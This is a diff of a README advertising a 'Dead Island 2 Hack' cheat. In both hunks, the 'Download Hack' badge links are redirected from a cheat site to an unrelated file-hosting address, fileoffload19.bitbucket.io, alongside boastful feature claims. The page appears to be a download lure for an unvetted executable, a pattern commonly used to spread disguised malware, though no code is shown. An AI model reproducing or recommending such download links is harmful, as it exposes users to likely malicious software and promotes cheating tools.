@@ -6,7 +6,7 @@ In the chaotic open-world of **Dead Island 2**, the undead don’t play fair. Bu
 
 🎮 From noob to death god in under 60 seconds.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/dead-island-2/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 💥 Top Features in a Dead Island 2 Hack
@@ -43,7 +43,7 @@ In the chaotic open-world of **Dead Island 2**, the undead don’t play fair. Bu
 * ✅ **Unlock All Mods & Blueprints** – Skip story locks
 * ✅ **No Item Weight** – Carry 100+ weapons like nothing
 
-[![Download Hack](https://files.vgtimes.ru/download/posts/2022-08/thumbs/1660563247_l7vj_tbgli1bq4xuhpeqcg.webp)](https://wecheaters.github.io/cheats/dead-island-2/)
+[![Download Hack](https://files.vgtimes.ru/download/posts/2022-08/thumbs/1660563247_l7vj_tbgli1bq4xuhpeqcg.webp)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 🆚 Dead Island 2 Hack vs Trainer vs Vanilla
